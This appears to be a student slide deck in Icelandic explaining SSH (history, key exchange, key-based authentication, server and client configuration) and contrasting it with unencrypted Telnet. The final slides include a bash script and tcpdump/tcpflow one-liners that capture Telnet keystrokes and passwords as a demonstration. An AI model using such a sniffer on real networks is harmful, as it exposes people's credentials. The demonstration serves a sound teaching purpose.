# SSH
## Secure shell

Hjalti Geir Garðarsson

Guðmundur Óli Norland

Teitur Guðmundsson

---

# SSH
## Secure Shell 
Hin örugga skel
---
### Telnet
### 1969
<img src="https://southwestcollection.files.wordpress.com/2014/01/14b-old-computer-lab-u185-6-bw.jpg" width="600">

---
<img src="https://i.imgur.com/cf3iAjN.png" width="550">
---
<img src="https://i.imgur.com/PG4VH2J.png" width="600">
---
<img src="https://image.cnbcfm.com/api/v1/image/106114015-1567698570831gettyimages-817486028.jpeg?v=1569948524&w=678&h=381" width="600">
---
### Tatu Ylönen
### 1995
### SSH-1
### Teknillinen korkeakoulu
### Password sniffing
---
#### rlogin
#### Telnet
#### FTP
#### rsh
---
<img src="https://image.slidesharecdn.com/sshnetsecure08-12695476747606-phpapp01/95/introduction-to-ssh-12-728.jpg?cb=1269602044" width="650">
---
### Það sem SSH lofar
  * Strong encryption
  * Strong authentication
  * Authorization
  * Integrity of communication
  * Forwarding or tunneling
---
### Það sem SSH getur ekki lofað
   * Vondar stillingar
   * Spilltur root aðgangur
   * Óöruggar heimamöppur
---
```
~ ssh -v teg6@hekla.rhi.hi.is
OpenSSH_8.0p1, OpenSSL 1.0.2t  10 Sep 2019
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: Connecting to hekla.rhi.hi.is [130.208.165.2] port 22.
debug1: Connection established.
debug1: identity file /home/teytur/.ssh/id_rsa type 0
debug1: identity file /home/teytur/.ssh/id_rsa-cert type -1
debug1: identity file /home/teytur/.ssh/id_dsa type -1
debug1: identity file /home/teytur/.ssh/id_dsa-cert type -1
debug1: identity file /home/teytur/.ssh/id_ecdsa type -1
debug1: identity file /home/teytur/.ssh/id_ecdsa-cert type -1
debug1: identity file /home/teytur/.ssh/id_ed25519 type -1
debug1: identity file /home/teytur/.ssh/id_ed25519-cert type -1
debug1: identity file /home/teytur/.ssh/id_xmss type -1
debug1: identity file /home/teytur/.ssh/id_xmss-cert type -1
debug1: Local version string SSH-2.0-OpenSSH_8.0
debug1: Remote protocol version 2.0, remote software version OpenSSH_5.3
debug1: match: OpenSSH_5.3 pat OpenSSH_5* compat 0x0c000002
debug1: Authenticating to hekla.rhi.hi.is:22 as 'teg6'
debug1: SSH2_MSG_KEXINIT sent
debug1: SSH2_MSG_KEXINIT received
debug1: kex: algorithm: diffie-hellman-group-exchange-sha256
debug1: kex: host key algorithm: ssh-rsa
debug1: kex: server->client cipher: aes128-ctr MAC: umac-64@openssh.com compression: none
debug1: kex: client->server cipher: aes128-ctr MAC: umac-64@openssh.com compression: none
debug1: SSH2_MSG_KEX_DH_GEX_REQUEST(2048<3072<8192) sent
debug1: got SSH2_MSG_KEX_DH_GEX_GROUP
debug1: SSH2_MSG_KEX_DH_GEX_INIT sent
debug1: got SSH2_MSG_KEX_DH_GEX_REPLY
debug1: Server host key: ssh-rsa SHA256:4jlEv000KCUwqreId0hqmCsGyQljTGO1qWnWC20TdGs
debug1: Host 'hekla.rhi.hi.is' is known and matches the RSA host key.
debug1: Found key in /home/teytur/.ssh/known_hosts:5
debug1: rekey out after 4294967296 blocks
debug1: SSH2_MSG_NEWKEYS sent
debug1: expecting SSH2_MSG_NEWKEYS
debug1: SSH2_MSG_NEWKEYS received
debug1: rekey in after 4294967296 blocks
debug1: Will attempt key: /home/teytur/.ssh/id_rsa RSA SHA256:Sv9fy0mW9SO7LxWqe5mr8UxSzx2jT6qo2zci7vAo1I8 agent
debug1: Will attempt key: /home/teytur/.ssh/id_dsa 
debug1: Will attempt key: /home/teytur/.ssh/id_ecdsa 
debug1: Will attempt key: /home/teytur/.ssh/id_ed25519 
debug1: Will attempt key: /home/teytur/.ssh/id_xmss 
debug1: SSH2_MSG_SERVICE_ACCEPT received
debug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,password
debug1: Next authentication method: publickey
debug1: Offering public key: /home/teytur/.ssh/id_rsa RSA SHA256:Sv9fy0mW9SO7LxWqe5mr8UxSzx2jT6qo2zci7vAo1I8 agent
debug1: Authentications that can continue: publickey,gssapi-keyex,gssapi-with-mic,password
debug1: Trying private key: /home/teytur/.ssh/id_dsa
debug1: Trying private key: /home/teytur/.ssh/id_ecdsa
debug1: Trying private key: /home/teytur/.ssh/id_ed25519
debug1: Trying private key: /home/teytur/.ssh/id_xmss
debug1: Next authentication method: password
teg6@hekla.rhi.hi.is's password: 
debug1: Authentication succeeded (password).
Authenticated to hekla.rhi.hi.is ([130.208.165.2]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
Last login: Wed Oct 23 22:29:41 2019 from l46a-510.gardur.hi.is
+------------------------------------------------------------------------------+
|                                                                              |
|       Thu ert ad tengjast Heklu (hekla.rhi.hi.is) fjolnotendavel RHI.        |
|       Fyrir alla nemendur og starfsmenn Haskola Islands.                     |
|       Leidbeiningar: http://rhi.hi.is/fjolnotendatolvur                      |
|                                                                              |
|       You are connecting Hekla (hekla.rhi.hi.is) for all students and        |
|       staff of the University of Iceland.                                    |
|       Instructions: http://rhi.hi.is/multi_user_computers                    |
|                                                                              |
+------------------------------------------------------------------------------+

Styrikerfi: GNU/Linux
CentOS release 6.10 (Final)

Fjoldi tengdra notenda: 9
-bash-4.1$ 

```
---

# Dulkóðun

---

#### Tenging á milli biðlara og vefþjóns með SSH

![](http://m.quickmeme.com/img/b0/b06da8c574e952e26317cd138399665cb06d64396a2f00a9921f5eb7280a4758.jpg)

---

### Þrjú skref:

1. Biðlarinn auðkennir þjóninn.

2. Búinn til lotulykill (session key) til að dulkóða og afkóða skilaboð.

3. Þjónninn auðkennir biðlarann.

---

#### Skref 1 (biðlarinn auðkennir þjóninn)

* Ef biðlarinn er að tengjast þjóninum í fyrsta skiptið er hann beðinn um að auðkenna lykilinn handvirkt.

* Ef biðlarinn samþykkir er lyklinum bætt við í *~/.ssh/known_hosts* skránna.

----

![](https://i.imgur.com/vIwKlF8.png)

----

* Gert til að muna hvaða þjónum biðlarinn hefur tengst áður. 

* Verst t.d. DNS árásum.

* Ef biðlarinn þekkir ekki lykilinn fær hann kærkomna villumeldingu.

---

#### Skref 2 (lotulykill)

* lotulykil nauðsynlegur til að dulkóða og afkóða skilaboð.

* Samhverfir (symmetric) lyklaalgoriðmar nota einn lykil til að dulkóða og afkóða, ósamhverfir (asymmetric) tvo.

* Diffie-Helmann mjög algengur ósamhverfur algoriðmi.

* Notum Diffie-Helmann til að búa til sameiginlegt, samhverft leyndarmál á milli biðlara og þjóns.

----

#### Einfalt litadæmi

![](https://i.imgur.com/UBDlMhs.png)

----

![](https://i.imgur.com/1HBglSw.png)

----

![](https://i.imgur.com/zDHBsyJ.png)

----

![](https://i.imgur.com/ey7bz3V.png)

---

#### Skref 3 (þjónninn auðkennir biðlarann)

* Einfaldasta aðferðin að nota lykilorð. 

* Ekki mælt með vegna takmarkana á flækjustigi lykilorða.

* Mælt með að nota SSH lyklapör.

----

<img src="https://i.imgur.com/kuE5K6R.png" width=1000 />

----

<img src="https://i.imgur.com/NUtPve6.png" height=650 />

----

<img src="https://i.imgur.com/a1bXcmp.png" height=650 />

----

#### Ósamhverfir lyklaalgorðmar

Án þess að vita neina stærðfræði á bakvið lyklaalgoriðma þurfum við að treysta þessu tvennu um ósamhverfa lyklaalgoriðma:

----

1. Öll skilaboð sem eru dulkóðuð með lyklinum hjá aðila geta einungis verið afkóðuð með einkalykli aðilans.

2. Aðili með aðgang að almenna lyklinum hjá aðila getur staðfest ef skilaboð voru send af einhverjum með aðgang að einkalykli aðilans.

----

### Auðkennisskref

1. Biðlarinn sendir auðkennisskilaboð um hvaða lyklapar hann vill nota til að tengjast við þjóninn.

2. Þjónninn skoðar authorized_keys skránna, ef hann finnur almennan lykil fyrir þetta auðkenni þá sendir þjónninn skilaboð til biðlarans, dulkóðuð með lyklinum.

----

3. Skilaboðin geta einungis verið afkóðuð með samsvarandi einkalykli, ef biðlarinn er með hann afkóðar hann skilaboðin.

4. Biðlarinn sendir skilaboð til þjónsins, dulkóðuð með nýafkóðuðu skilaboðunum sem og lotulyklinum.

5. Þjónninn framkvæmir sömu dulkóðunina og ber saman við gildið frá biðlaranum, ef gildin stemma sannar það að biðlarinn er með einkalykilinn og er því auðkenndur.

---

## SSH server 
### vs 
## Telnet server

---

## ssh server

```console
openssh-server
```

* `sshd` - OpenSSH SSH daemon

----

## SSH config

```
/etc/ssh/sshd_config
```

```config
PasswordAuthentication no
```

----

<img src="assets/sshd_restart.png" width="900"/>

<img src="assets/ssh_no_key.png" width="900"/>

----

## ssh client

```
~/.ssh/config
```

```conf
Host jotunn.rhi.hi.is
  IdentityFile ~/.ssh/jotunn_hpc
Host hekla.rhi.hi.is
  IdentityFile ~/.ssh/hekla
Host github.com
  HostName github.com
  IdentityFile ~/.ssh/git_hub
  User git
HOST localhost
  IdentityFile ~/.ssh/local
```

---

## Telnet server

```console
xinetd
telnetd
```

* `xinetd` - the extended Internet services daemon

* `telnetd` - DARPA telnet protocol server

----

```
/etc/xinetd.d/telnet
```

```conf
# default: on
# description: The telnet server serves telnet sessions; it uses
# unencrypted username/password pairs for authentication.
service telnet
{
  disable = no
  socket_type = stream
  wait = no
  user = root
  server = /usr/sbin/in.telnetd
  log_on_failure += USERID
}
```

----

<img src="assets/telnet_login_disabled.png" width="900"/>

---

![](assets/netstat.png)

---

## Man-in-the-middle attacks

Nota þessa tvo *packet-analyzer*/*packet-sniffer*
* tcpdump
* tcpflow

----

## ssh

<img src="assets/ssh_login.gif" width="480"/>

<img src="assets/ssh_tcpdump.gif" width="480"/>

----

## telnet

<img src="assets/telnet_login.gif" width="480"/>

<img src="assets/telnet_tcpdump_src.gif" width="480"/>

----

## Password og keylogger

<img src="assets/telnet_tcpdump_dst_pwd.gif" width="480"/>

<img src="assets/telnet_tcpdump_dst_keys.gif" width="480"/>

---

## Skriptu keylogger

```bash
#!/bin/bash
  
# Uses tcpdump to extract keystrokes from a telnet session
# on localhost port 23 and tcpflow to format output

# Check if user is running as root
if [[ $EUID -ne 0 ]]; then
    echo "Please run as root:"
    echo "sudo $0"
    exit 1
fi

# Output file
keylog=$PWD/keylogs

# Log keystrokes to port 23
sudo tcpdump 'tcp dst port 23 and tcp[13] & 8 != 0' -i lo -l -w - | tcpflow -C -r - >> $keylog
```

```
sudo ./telnet_keylogger.sh & disown
```

---

## Skipanir

Keylogger + **stdout**
```
sudo tcpdump 'tcp src port 23 and tcp[13] & 8 != 0' -i lo -l -w - | tcpflow -C -r -
```

Keylogger
```
sudo tcpdump 'tcp dst port 23 and tcp[13] & 8 != 0' -i lo -l -w - | tcpflow -C -r -
```

----

* <span style="color:blue">`tcpdump`</span>
  * Forrit til að fylgjast með umferð á *network*
* <span style="color:blue">`tcp dst port 23`</span>
  * Hlustum á allt sem er sent á port 23
* <span style="color:blue">`tcp[13] & 8 != 0`</span>
  * Síum þannig að **psh** pakkar eru skoðaðir
* <span style="color:blue">`-i lo`</span>
  * Við hlustum á localhost
* <span style="color:blue">`-l`</span>
  * Buffer á **stdout**
* <span style="color:blue">`-w -`</span>
  * Prentum beint út í **stdout**

----

* <span style="color:blue">`tcpflow`</span>
  * Forrit til að fylgjast með umferð á *network*
* <span style="color:blue">`-C`</span>
  * Prentar út í **stdout** án tcp header
* <span style="color:blue">`-r`</span>
  * Les út úr **stdout**, parað með `-w`
----